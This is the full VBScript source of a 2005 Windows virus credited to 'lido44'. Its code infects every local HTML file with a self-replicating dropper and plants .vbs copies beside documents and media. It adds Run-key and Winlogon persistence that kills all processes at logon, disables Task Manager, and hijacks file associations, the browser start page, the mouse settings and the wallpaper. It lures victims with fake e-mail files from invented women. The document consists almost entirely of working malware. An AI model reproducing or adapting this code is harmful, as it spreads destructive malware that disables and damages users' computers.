' I HATE BAAAC !->2005214F6<=id :(  // Version 0.2.1 - date: 29/05/2005
'                                                                       
'     _/         _/   _/_/     _/_/            _/          _/
'    _/         _/   _/  _/  _/   _/      _/  _/       _/ _/
'   _/         _/   _/  _/  _/   _/     _/   _/      _/  _/
'  _/         _/   _/  _/  _/   _/    _/    _/     _/   _/
' _/_/_/_/   _/   _/_/      _/_/     _/_/_/_/_/  _/_/_/_/_/
'                                         _/          _/
'                                        _/          _/  By lido44 - sfax/Tunisia
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
' nb. Not very dangerous - by (pitySoft)    
             
dim fso,sys32dir,HTMLname,l0,xup,ap,infectAfter,xmlfile,htmpage,root,aa,code0
dim wscr,rr
dim girl(12)
dim extf(42)

 on error resume next
set wscr = CreateObject("WScript.shell")
set fso = createObject ("Scripting.FileSystemObject")
set sys32dir = fso.getspecialfolder(1)
set winfolder = fso.getspecialfolder(0)
set c=fso.GetFile(WScript.scriptFullName)
dim d,dc,s
set dc=fso.drives
girl(1)="Sarah_icqGroup":girl(2)="imen_nannou":girl(3)="ahlem_3ishk":girl(4)="amina_kissme":girl(5)="amel_sousse":girl(6)="sana_hammamet"
girl(7)="molka_nabeul":girl(8)="noura_sfax":girl(9)="amani_staracademy":girl(10)="sandra_algerie"
girl(11)="madiha_ariana":girl(12)="sonia_malhat_manar2" 
randomize
xgirl = girl(int(rnd*12)+1)
Girlmessage = "e-mail from#"&xgirl&"@yahoo.fr.htm"
wscr.Regwrite "HKEY_CLASSES_ROOT\LIDO44.FILE\DefaultIcon\",sys32dir & "\user44.ico"
HTMLname = "www.MacDonald.com-index.htm"
htmpage="\www.MacDonald.com-index.htm"
englishDialog ="[English]: Recived: e-mail from "&xgirl&"@yahoo.fr "&vbcrlf&_
"*This file was copied in your desktop, you can now read it."
frenchDialog ="[French]: Re�u: e-mail depuis "&xgirl&"@yahoo.fr "&vbcrlf&_
"*Ce courrier a �t� copi� sur votre bureau, vous pouvez maintenant le lire."
 l0 = chr(34)
extf(1)="mp2":extf(8)="dll":extf(15)="ppt":extf(22)="ocx":extf(29)="tar":extf(36)="js"
extf(2)="htm":extf(9)="html":extf(16)="avi":extf(23)="mpg":extf(30)="mpeg":extf(37)="doc"
extf(3)="xls":extf(10)="jpg":extf(17)="jpeg":extf(24)="bmp":extf(31)="css":extf(38)="mov"
extf(4)="dat":extf(11)="frm":extf(18)="mp3":extf(25)="fla":extf(32)="swf":extf(39)="iso"
extf(5)="txt":extf(12)="msg":extf(19)="dwg":extf(26)="wav":extf(33)="lnk":extf(40)="bin"
extf(6)="ini":extf(13)="inf":extf(20)="gif":extf(27)="mdb":extf(34)="3gp":extf(41)="zip"
extf(7)="rar":extf(14)="ace":extf(21)="pdf":extf(28)="cpp":extf(35)="c++":extf(42)="hlp"

Set WSREAD = FSO.OpenTextFile(sys32dir & "\VbScr.xml",1) 
Code0 = WSREAD.ReadAll 
WSREAD.Close

main()
         sub main() '~~~~~~~~~  M  A  I  N  ~~~~~~~~~
             infectAfter=5
          if c=sys32dir&"\winini.vbs" then
         update()
          end if
          SETUPInternetExplorer()
         htmvbscript()
          SelfCopy()
          AutoStartandrebootloop()          
          createhtml()
          CreateMylogoAsWindowsIcon()
          CreateSandwichImage()
          Propag() 
          if xup= 1 then 
          lie()
          msgbox englishDialog & vbcrlf & frenchDialog ,28,"Microsoft Mail - info"
          end if
         if xup=2 then
          wscr.Regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SAmail",""
          wscr.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\SAmail",""
         end if
          if xup >= 2+infectAfter then
             systemTIME()
             changeIcons()
             SETUPInternetExplorer()
             DisableCtrAlrSupp()
          end if
                if xup > 3+infectAfter then
          SETUPInternetExplorer()
          mouseSwap()
          background() 
          changeIcons()
          ADDfilesToDesktop()
          OpenManyApps()
          ShowMessage ()
          end if                          
          if c=sys32dir&"\winini.vbs" then
        do 
           IntegrateInHtms()
        loop  
        end if
            end sub  '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

function CopyInShellFolders(pth0)
 on error resume next
fullpth=wscr.regread(pth0+"Cache") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"CD Burning") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"Favorites") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"Favorites") :sandwichhtm fullpth & htmpage  
fullpth=wscr.regread(pth0+"History") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"My Music") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"My Pictures") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"My Video") :sandwichhtm fullpth  & htmpage
fullpth=wscr.regread(pth0+"Personal") :sandwichhtm fullpth & htmpage
fullpth=wscr.regread(pth0+"Programs") :sandwichhtm fullpth  & htmpage
fullpth=wscr.regread(pth0+"Start Menu") :sandwichhtm fullpth & htmpage
end function

function createFile(filename,fstring)
on error resume next
set  ap=fso.CreateTextfile(filename)
     ap.write fstring
     ap.close
end function

function StrtEachStartup(KeyName,KeyVal)
on error resume next
wscr.Regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"&KeyName,KeyVal
wscr.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\"&KeyName,KeyVal
end function

function sandwichhtm(theHtm)
on error resume next
set c1=fso.GetFile(sys32dir&"\www.MacDonald.com-index.htm")
c1.copy (theHtm)
end function

sub createhtml ()
on error resume next
Set WSREAD = FSO.OpenTextFile(sys32dir&"\VbScr.xml",1)
    Code = WSREAD.ReadAll
    WSREAD.Close
  xhtm =    code & vbcrlf& "<html><head><meta http-equiv="&l0&"Content-Language="&l0&" content=="&l0&"fr="&l0&">"&_
           "<meta http-equiv="&l0&"Content-Type"&l0&" content="&l0&"text/html; charset=windows-1252"&l0&">"&_
           "<meta name="&l0&"GENERATOR"&l0&" content="&l0&"Microsoft FrontPage 4.0"&l0&" text="&l0&"#FFFFFF"&l0&" 000000"&l0&" FFFFFF"&l0&" ProgId#000000"&l0&">"&_
           "</head>"&_
           "<font face="&l0&"Times New Roman, Times, serif"&l0&"><span style="&l0&"background-color"&l0&"#000000"&l0&"><font color="&l0&"#FF0000"&l0&">"&_
           "</font></span></font><table width="&l0&"80%"&l0&" border="&l0&"0"&l0&">"&_ 
           "  <tr bgcolor="&l0&"#FFFFFF"&l0&" bordercolor="&l0&"#FFFFFF"&l0&">"&_ 
           "    <td width="&l0&"100%"&l0&" nowrap>"&_
           "      <table width="&l0&"100%"&l0&" border="&l0&"0"&l0&" bgcolor="&l0&"#FFFFCC"&l0&">"&_
           "        <tr bgcolor="&l0&"#FF3333"&l0&">"&_
           "          <td><b><font color="&l0&"#FFFFFF"&l0&">N.B. </font></b></td>"&_
           "        </tr>"&_
           "        <tr>"&_
           "          <td><font color="&l0&"#000000"&l0&"><i><b>Appuyez maintenant sur F5 ensuite cliquez"&_
           "            sur le bouton OUI 'activer ActiveX ' pour continuer correctement."&_
           "            </b></i></font></td>"&_
           "        </tr>"&_
           "        <tr>"&_
           "          <td><font color="&l0&"#000000"&l0&"><i><b>Press F5 then clic YES' enable ActiveX'"&_
           "            Button to continue loading correctly this page. </b></i></font></td>"&_
           "        </tr>"&_
           "      </table>"&_
           "      <span style="&l0&"background-color"&l0&"#000000"&l0&"><font face="&l0&"Courier New, Courier, mono"&l0&" size="&l0&"6"&l0&">"&_
           " </font></span>"&_
           " <table width="&l0&"100%"&l0&" border="&l0&"0"&l0&" bgcolor="&l0&"#3300CC"&l0&">"&_
           "    <tr>"&_
           "      <td><span style="&l0&"background-color"&l0&"#000000"&l0&"><font face="&l0&"Courier New, Courier, mono"&l0&" size="&l0&"6"&l0&">"&_
           "</font></span><img src="&l0&"file:///"&l0&" width="&l0&"159"&l0&" height="&l0&"75"&l0&">"&_
           "<font size="&l0&"6"&l0&" color="&l0&"#CCCCCC"&l0&">http://www.MacDonald.com/</font></td>"&_
           "        </tr>"&_
           "      </table>"&_
           "      <span style="&l0&"background-color"&l0&"#000000"&l0&"><font face="&l0&"Courier New, Courier, mono"&l0&" size="&l0&"6"&l0&">"&_
           "      </font></span>"&_
           "      <hr>"&_
           "      <h5 align="&l0&"center"&l0&"><span style="&l0&"background-color"&l0&"#000000"&l0&"> "&_
           "<font face="&l0&"Courier New, Courier, mono"&l0&" size="&l0&"6"&l0&">"&_
           "        All&ocirc; ... MacDonald ;)</font></span></h5>"&_
           "      <h1 align="&l0&"center"&l0&"><span style="&l0&"background-color"&l0&"#000000"&l0&">"&_
           "   <img src="&l0&sys32dir&"\snd44.gif"&l0&" width="&l0&"220"&l0&" height="&l0&"125"&l0&"></span></h1>"&_
           "      <h1 align="&l0&"center"&l0&"><span style="&l0&"background-color"&l0&"#000000"&l0&">&nbsp;Mabannou"&_
           "        Saaaaaandwich ! </span></h1>"&_
           "      <p>&nbsp;</p>      <p>&nbsp;</p>"&_
           "      <p align="&l0&"right"&l0&"><span style="&l0&"background-color"&l0&"#000000"&l0&">"&_
           " <font color="&l0&"#FF0000"&l0&" face="&l0&"Times New Roman, Times, serif"&l0&">&nbsp;</font></span></p>"&_
           "      <p align="&l0&"right"&l0&"><font face="&l0&"Times New Roman, Times, serif"&l0&">"&_
           " <span style="&l0&"background-color"&l0&"#000000"&l0&"><font color="&l0&"#FF0000"&l0&_
           " face="&l0&"Times New Roman, Times, serif"&l0&"><i><u>"&_
           "<font size="&l0&"1"&l0&" color="&l0&"#999999"&l0&">Sandwiched</font></u>"&_
           "        </i><font size="&l0&"1"&l0&" color="&l0&"#999999"&l0&">by happy $lido44$&nbsp; : )"&_
           "</font></font><font color="&l0&"#999999"&l0&" size="&l0&"1"&l0&">Sfax,"&_
           "        Tunisia</font></span></font></p>"&_
           "    </td>  </tr></table><p align="&l0&"right"&l0&"><font face="&l0&"Times New Roman, Times, serif"&l0&">"&_
           "<span style="&l0&"background-color"&l0&"#000000"&l0&"></span></font></p>"
createFile  sys32dir&"\"&HTMLname, xhtm
end sub 

sub SelfCopy()
 on error resume next
c.copy (sys32dir & "\winini.vbs")
end sub

sub SETUPInternetExplorer()
on error resume next
wscr.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",sys32dir&"\"&HTMLname
end sub 

sub mouseSwap()
on error resume next
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons","1"
wscr.Regwrite "HKEY_USERS\.DEFAULT\Control Panel\Mouse\SwapMouseButtons","1"
end sub

sub background()
on error resume next
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\Colors\Background","200 100 100"
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\wallpaper",sys32dir& "\snd44.gif"
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\OriginalWallpaper",sys32dir & "\snd44.gif"
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle","2"
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics\Shell Icon Size", "72"
end sub

sub systemTIME()
on error resume next
wscr.Regwrite "HKEY_CURRENT_USER\Control Panel\International\sTimeFormat","LIDO44 @ NO TIME !!!"
wscr.Regwrite "HKEY_USERS\.DEFAULT\Control Panel\International\sTimeFormat","LIDO44 @ NO TIME !!!"
wscr.Regwrite "HKEY_CURRENT_USER\Console\ScreenColors","4"
wscr.Regwrite "HKEY_CURRENT_USER\Console\FullScreen","1"
end sub

sub ShowMessage () 
on error resume next
mylogo="                    /\         /\" & vbcrlf &_
       "                   //   /| |\   \\" & vbcrlf&_
       "                  //    || ||    \\" & vbcrlf&_
       "                 (////||X|||\\\\)" & vbcrlf&_
       "                        || ||" & vbcrlf&_
       "                        \| |/ " & vbcrlf & vbcrlf
msgbox "kernel32.dll @"&vbcrlf&"SET NEW fs.kernel:=[Lido44.dll] ;) "&vbcrlf&"Kernel44.dll : Sandwich based" _ 
& vbcrlf & vbcrlf & mylogo& "          -= THE MAD KERNEL =-",28,"WinZaws explorer [KERNEL32.DLL]"
end sub

sub ADDfilesToDesktop()
 on error resume next
 rr = wscr.regread("HKEY_CURRENT_USER\Software\Microsoft\"&_
 "Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
  for i=1 to 99
   set c=fso.GetFile(sys32dir&"\"&HTMLname)
   htmxfiles="\message_sandwich{"& hex(int(timer+date+i)) &"}.htm"
   c.copy (rr  & htmxfiles ) 
 next 
end sub

sub AutoStartandrebootloop()
on error resume next
  StrtEachStartup "Winini.dll",sys32dir & "\winini.vbs"
  if xup > 4+infectAfter then 
  StrtEachStartup "kernel44.dll","taskkill /f /fi "&l0&"PID ge 0"&l0&"  /im *"
  wscr.Regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\"&_
  "CurrentVersion\Winlogon\shell","taskkill /f /fi "&l0&"PID ge 0"&l0&"  /im *"
  end if 
end sub

sub update()
on error resume next
xup=0
xup = wscr.Regread ("HKEY_LOCAL_MACHINE\shell")
xup=xup+1
wscr.Regwrite "HKEY_LOCAL_MACHINE\shell",xup
end sub

sub lie()
on error resume next
usrname = wscr.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\"&_
 "CurrentVersion\Explorer\Logon User Name")
randomize
k =int((rnd*5) +1)
select case k
case 0: prefix = "98"
case 1: prefix = "97"
case 2: prefix = "96"
case 3: prefix = "95"
case 4: prefix = "22"
case 5: prefix = "21"
end select 
do while p1 < 128
p1 = int(rnd*999)
loop
do while p2 < 128
p2 = int(rnd*999)
loop
randomize
rdvday=(int(rnd*4)+2)
wd = weekday(date)+rdvday
if wd >7 then wd=wd -7 
select case wd
case 1: xwd = "dimanche"
case 2: xwd  = "lundi"
case 3: xwd  = "mardi"
case 4: xwd  = "mercredi"
case 5: xwd  = "jeudi"
case 6: xwd  = "vendredi"
case 7: xwd  = "samedi"
end select
GirlMsg="<head><title></title></head><body bgcolor="&l0&"#FFCCCC"&l0&">"&_
         "<div class="&l0&"Section1"&l0&" style="&l0&"width: 628; height: 224"&l0&">"&_ 
         "  <table width="&l0&"100%"&l0&" border="&l0&"0"&l0&" bgcolor="&l0&"#FFFFFF"&l0&" height="&l0&"40"&l0&">"&_
         "    <tr> "&_
         "      <td width="&l0&"17%"&l0&"><font color="&l0&"#000000"&l0&">Form&nbsp;<a          href="&l0&"mailto:"&xgirl&"@yahoo.fr"&l0&">:</a></font></td>"&_
         "      <td width="&l0&"83%"&l0&"><a href="&l0&"mailto:"&xgirl&"@yahoo.fr"&l0&">"&xgirl&"@yahoo.fr</a></td>"&_
         "    </tr>"&_
         "    <tr> "&_
         "      <td width="&l0&"17%"&l0&"><font color="&l0&"#000000"&l0&">To</font></td>"&_
         "      <td width="&l0&"83%"&l0&"><font color="&l0&"#000000"&l0&"><i>"& usrname &" </i></font></td>"&_
         "    </tr>"&_
         "  </table>"&_
         "  <hr>  <p class="&l0&"MsoNormal"&l0&">Message :</p>  "&_
         "  <table width="&l0&"50%"&l0&" border="&l0&"1"&l0&">"&_
         "    <tr bgcolor="&l0&"#FFFEF4"&l0&"> "&_
         "      <td height="&l0&"223"&l0&"> "&_
         "        <p><font color="&l0&"#000000"&l0&">Le "&date&", </font></p>        "&_
         "        <p><font color="&l0&"#000000"&l0&"> Notre rendez-vous sera apr�s " &rdvday& " jours ("&xwd&")"&_
         "</font><font color="&l0&"#000000"&l0&"> - appelle-moi "&_
         "         apr�s 7 heures de l'apr�s-midi.</font></p>"&_
         "       <p><font color="&l0&"#000000"&l0&">Tel: +216 "&prefix&" "&p1&" "&p2&" - C�est urgent </font></p>"&_
         "        <p align="&l0&"right"&l0&"><font color="&l0&"#000000"&l0&">"&xgirl&", SFAX-TUN </font></p>"&_
         "      </td>    </tr>  </table>  <p class="&l0&"MsoNormal"&l0&">&nbsp; </p></div>"
rr = wscr.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\"&_
 "CurrentVersion\Explorer\Shell Folders\Desktop")
rr = rr & "\" &  Girlmessage
createFile rr,GirlMsg
wscr.Regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SAmail",rr
wscr.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\SAmail",rr
end sub

sub OpenManyApps()
on error resume next
for i=1 to 12
StrtEachStartup "l44sys"&i,"freecell"
StrtEachStartup "l44sys"&i+32,"winmine"
StrtEachStartup "l44sys"&i+64,"iexplore"
next 
end sub

sub CreateMylogoAsWindowsIcon()  
on error resume next
dim imageascii,m
imageascii="000000001000001000032032016000000000000000232002"&_
           "000000022000000000040000000000032000000000064000"&_
           "000000001000004000000000000000128002000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000128000000128000000000128128000128000"&_
           "000000128000128000128128000000192192192000128128"&_
           "128000000000255000000255000000000255255000255000"&_
           "000000255000255000255255000000255255255000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000005128000000000000000000000000000000000000"&_
           "000000000001017049048016000000000000000000000000"&_
           "000000019056051147057056049016000000000000000000"&_
           "001059155147185185187155187155051016000000000000"&_
           "027057184179051051019049051059139131000000000000"&_
           "056179147049051019019019019019049059016000000128"&_
           "019049019147147051057051057057051017048000000117"&_
           "001056049051057147147049019051147147128000000000"&_
           "001081055051017017017017056048019049000000000000"&_
           "051049019051051147051179051019055176000000000000"&_
           "056051051185185185185059153051051051000000000000"&_
           "000057185179187187155185187051131019048000000007"&_
           "001059059185185155155155147147059051128000000000"&_
           "001139155155059179179179179051147187016000000000"&_
           "000003185185187187155179179051019059048000000000"&_
           "008001051139155185185185179145051155048000000000"&_
           "000112000051184187059155051059155131016000000000"&_
           "000000129000001051059051179179051049000000000000"&_
           "000000007136000000017049051016000000000000000000"&_
           "000000000000120128016000000000128128000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000000000"&_
           "000000000000000000000000000000000000000000255255"&_
           "255255255255255255255255255255255255255255255255"&_
           "255255255255255255255128015255255000001255252000"&_
           "000063240000000015240000000007224000000003192000"&_
           "000003192000000003192000000003192000000003192000"&_
           "000003224000000003224000000003240000000003248000"&_
           "000003248000000003252000000007255000000015255128"&_
           "000015255240000031255255255255255255255255255255"&_
           "255255255255255255255255255255255255255255"
 m=""
for i=1 to len(imageascii) step 3
k = chr(mid (imageascii,i,3))
m=m & k
next 
createFile sys32dir & "\user44.ico",m
end sub

sub CreateSandwichImage()
on error resume next
SandImage="071073070056057097086000046000179007000093050014"&_
          "245221146156145084232173047217162097246212101166"&_
          "091048253252244107092044208109076000000000000000"&_
          "000000000000000000000000000000000000000044000000"&_
          "000000086000046000000004255240200073171189056207"&_
          "192137255073040130156102158104122004032081120069"&_
          "060204116077170120142117114239255191081044160043"&_
          "162056172161114201108202066003023209152065090175"&_
          "214021214185237002097084137181037138146133092175"&_
          "218009206117090181184220028173173239235079234061"&_
          "239219157052048120131075109059044048126127139049"&_
          "082105132144134021136138143150151144121004023137"&_
          "149127153152160093046147046158161168169160020073"&_
          "159170106142076045162106172174175180049006000000"&_
          "082036163177091027157184185067191099008002180195"&_
          "183197169002000006211006190044211162164043193207"&_
          "152002213004008188188212229035231232006088209008"&_
          "068173221091046036242202044226002223210228230252"&_
          "034187237246196009172007196024034121032004226091"&_
          "022064225194093212246077147054017193052095227006"&_
          "002084037072009194051021255149245242224144164192"&_
          "126213052046212056144022001115099080134100055238"&_
          "159180104011105102212089111101079113121166104233"&_
          "000238195053127072107222211088244091078150060151"&_
          "102028040096219199055098064202052167111170072113"&_
          "230094042203249175090192113038085034088193043167"&_
          "054009212094034141059023219081158248238213253214"&_
          "239032222177109221077197087066130220186016207129"&_
          "221215098048069196114037206245250149136212175132"&_
          "237145180233149176219131035162134229187181028203"&_
          "150007212082246249245242231195072073070061061245"&_
          "034191154121235081029027117118238123110061076236"&_
          "071209034101139033141075038023025045102183069129"&_
          "067047010241097136140201233194097084142134057239"&_
          "255216005231155004201071225123175087071015219054"&_
          "137083149068164230125166062008186017031035214127"&_
          "113033124079216204023154174047236221055154063252"&_
          "241103064032005244007008023138044099088113250181"&_
          "151014100212012048013128100164210071085019098087"&_
          "026098011206080226127141216119201045155024198213"&_
          "086143161120138095011209232136092047104040075139"&_
          "007188228071002026250227204131167076242070078241"&_
          "176193099000027206056228051071092113163148111189"&_
          "131162021052140241200148066233064165020172112243"&_
          "140152192020022198009229017025137053194156089132"&_
          "065108096225166155087100009141156115230041198154"&_
          "193232233167005163120241231160026056065232161056"&_
          "116137232162026068000000059"
 m=""
for i=1 to len(SandImage) step 3
k = chr(mid (SandImage,i,3))
m=m & k
next 
createFile sys32dir & "\snd44.gif",m
end sub

sub changeIcons()
on error resume next
for i=0 to 42
wscr.Regwrite "HKEY_CLASSES_ROOT\."& extf(i) &"\","LIDO44.FILE"
next
end sub

Sub Propag()
 on error resume next
for Each d in dc
if (d.DriveType = 2 or d.DriveType = 1 or d.DriveType = 3) and d.path<>"A:"  then 
 sandwichhtm d.path  & htmpage
end if 
next
xpath ="HKEY_CURRENT_USER\Software\Microsoft\Windows\"&_
  "CurrentVersion\Explorer\Shell Folders\"
CopyInShellFolders(xpath)
end sub

sub DisableCtrAlrSupp() 
 on error resume next 
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD" 
end sub

sub htmvbscript()
 on error resume next 
Set FSO = CreateObject("Scripting.FileSystemObject") 
Set WSREAD = FSO.OpenTextFile(c,1) 
Code = WSREAD.ReadAll 
WSREAD.Close
for i=1 to len (code) 
k=mid(code,i,1)
if asc(k) = 10 or asc(k) = 13 or asc(k) = 34 or asc(k) = 47 then
 k=chr(34)& "&" &"chr("&asc(k)&")&"& chr(34) 
end if 
v=v+k
next
v="ap.write"&chr(34)&v&chr(34)
v0 ="<!--happylido44;)--><script language="&chr(34)&"VBScript"&chr(34)&">"&vbcrlf
v0=v0 & "on error resume next"&vbcrlf
v0=v0 & "Set FSO = CreateObject("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")"&vbcrlf
v0=v0 & "set wscr = CreateObject("&chr(34)&"WScript.shell"&chr(34)&")"&vbcrlf
v0=v0 & "wscr.Regwrite "&chr(34)&"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Winini.dll"&chr(34)&",fso.getspecialfolder(1) & "&l0&"\winini.vbs"&l0&vbcrlf
v0=v0 & "wscr.Regwrite "&chr(34)&"HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\Winini.dll"&chr(34)&",fso.getspecialfolder(1) & "&l0&"\winini.vbs"&l0&vbcrlf         
v0=v0 & "set  ap=fso.CreateTextfile(fso.getspecialfolder(1) & "&chr(34)&"\winini.vbs"&chr(34)&")"&vbcrlf
v0=v0 &  v & vbcrlf
v0=v0 & "ap.close" & vbcrlf
v0=v0 & "</script>"&vbcrlf
set  ap=fso.CreateTextfile(sys32dir&"\VbScr.xml")
ap.write v0
ap.close
end sub

sub IntegrateInHtms()
on error resume next
Set LIST_DRI = FSO.Drives 
For Each DRI In LIST_DRI 
aa= 0 
 If (DRI.DriveType = 1 or DRI.DriveType = 2 Or DRI.DriveType = 3)  and dri.path<>"A:" Then 
  root=dri.path & "\"
  DRI = DRI & "\"   
  Set FOLDER_DRI = FSO.GetFolder(DRI) 
  Set VERIF_FOL = FOLDER_DRI.SubFolders 
  For Each FOLR1 In VERIF_FOL 
 Next 
  Set LIST_FIL = FOLDER_DRI.Files 
  For Each FIL In LIST_FIL 
  Next 
Search_2 FOLDER_DRI 
end if 
Next
end sub

Function Search_2(F) 
on error resume next
Set LIST_FOL = F.SubFolders
For Each FOL In LIST_FOL
if aa=1 then
Set FOLDER_FOL = FSO.GetFolder(fol) 
end if 
if aa=0 then
Set FOLDER_FOL = FSO.GetFolder(root) 
aa=1
end if 
 Set LIST_FIL = FOLDER_FOL.Files 
For Each FIL In LIST_FIL 
if ucase(left(FIL,len(winfolder))) <> ucase(winfolder)then 
if ucase(right(FIL,4))=".HTM" or ucase(right(FIL,5))=".HTML" then
InfectHtmFiles(FIL)
end if 
randomize
xcf0 = int(rnd*10)
randomize
xcf1 = int(rnd*10)
if (ucase(right(FIL,4))=".MP3" or ucase(right(FIL,4))=".MPG" or ucase(right(FIL,4))=".DOC"_  
or ucase(right(FIL,4))=".XLS" or ucase(right(FIL,4))=".JPG" ) and xcf0=xcf1 then
c.copy (FIL & ".vbs")
end if 
end if 
Next 
 Search_2 FOL 
Next 
End Function 

function InfectHtmFiles(ToInfect)
Set WSREAD = FSO.OpenTextFile(ToInfect,1) 
Code = WSREAD.ReadAll 
WSREAD.Close
l0=chr(34)
if left(Code,len("<!--happylido44;)-->"))<>"<!--happylido44;)-->" then
set  ap=fso.CreateTextfile(ToInfect)
ap.write code0 & vbcrlf
ap.write Code
ap.close
end if 
end function

':) Smile ------ (x)PitySoft

